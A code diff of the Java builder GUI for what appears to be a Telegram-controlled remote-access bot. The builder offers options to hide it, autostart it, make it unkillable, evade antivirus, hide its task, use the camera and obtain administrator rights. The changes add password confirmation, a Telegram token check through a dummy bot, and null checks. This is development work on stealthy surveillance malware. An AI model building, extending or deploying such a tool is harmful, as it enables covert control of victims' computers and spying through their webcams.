@@ -38,26 +38,34 @@ public class BotCreate {
     private JCheckBox taskHideCheckBox;
     private JCheckBox aliveCheckCheckBox;
     private JPasswordField passwordPasswordField;
+    private JPasswordField passwordRepeatField;
     static JFrame frame = new JFrame("BotCreate");
 
     public BotCreate() {
-
         createButton.addActionListener(new ActionListener() {
             Config conf = BotCreate.read();
 
             @Override
             public void actionPerformed(ActionEvent e) {
                 char[] password = passwordPasswordField.getPassword();
+                char[] repeat = passwordRepeatField.getPassword();
                 String pw = new String(password);
+                String rep = new String(repeat);
+                if (telegramBotKeyTextField.getText().equals("bot token") || telegramBotKeyTextField.getText().length() < 10 || !telegramBotKeyTextField.getText().contains(":") || fail(telegramBotKeyTextField.getText())) {
+                    JOptionPane.showMessageDialog(null, "Invald Telegramtoken!", "Error", JOptionPane.ERROR_MESSAGE);
+                    return;
+                }
+                if (!pw.equals(rep)) {
+                    JOptionPane.showMessageDialog(null, "Passwords do not match!", "Error", JOptionPane.ERROR_MESSAGE);
+                    return;
+                }
                 conf = new Config(hiddenCheckBox.isSelected(), autostartCheckBox.isSelected(), startUpNotificationCheckBox.isSelected(), unkillableCheckBox.isSelected(),
                         antiAVCheckBox.isSelected(), trollFunctionsCheckBox.isSelected(), cameraCheckBox.isSelected(), privateCheckBox.isSelected(), taskHideCheckBox.isSelected(), aliveCheckCheckBox.isSelected(), telegramBotKeyTextField.getText(), botNameTextField.getText(), false, pw);
                 frame.dispose();
                 try {
+                    System.out.println(conf.startupNotification);
                     GetAdmin.config = conf;
                     GetAdmin.los();
-                    //GetAdmin bla = new GetAdmin();
-                    // bla.los();
-
                 } catch (Exception e1) {
                     e1.printStackTrace();
                 }
@@ -69,7 +77,7 @@ public class BotCreate {
             public void focusGained(FocusEvent e) {
                 Config conf = BotCreate.read();
                 if (telegramBotKeyTextField.getText().equalsIgnoreCase("Bot Token")) {
-                    if (conf.isReset())
+                    if (conf != null && conf.isReset())
                         telegramBotKeyTextField.setText(conf.getToken());
                     else
                         telegramBotKeyTextField.setText("");
@@ -91,7 +99,7 @@ public class BotCreate {
             public void focusLost(FocusEvent e) {
                 Config conf = BotCreate.read();
                 if (telegramBotKeyTextField.getText().equalsIgnoreCase("")) {
-                    if (conf.isReset())
+                    if (conf != null && conf.isReset())
                         telegramBotKeyTextField.setText(conf.getToken());
                     else
                         telegramBotKeyTextField.setText("Bot Token");
@@ -146,7 +154,6 @@ public class BotCreate {
             back = (Config) ois.readObject();
             ois.close();
         } catch (Exception e) {
-            System.out.println(e);
         }
         return back;
     }
@@ -156,12 +163,26 @@ public class BotCreate {
             TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
             telegramBotsApi.registerBot(bot);
         } catch (Exception e) {
-            //bo.stop();
             bot.setImage(3);
             Thread.sleep(5000);
             starten(bot);
             return;
         }
         bot.setImage(0);
+    }
+    boolean fail(String token){
+        BotSession bum = null;
+        boolean fail = false;
+        ApiContextInitializer.init();
+        TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
+        try {
+            bum = telegramBotsApi.registerBot(new DummyBot(token));
+        } catch (TelegramApiRequestException e) {
+            System.out.println(e);
+            fail = true;
+        }
+        if(!fail)
+            bum.stop();
+        return fail;
     }
 }
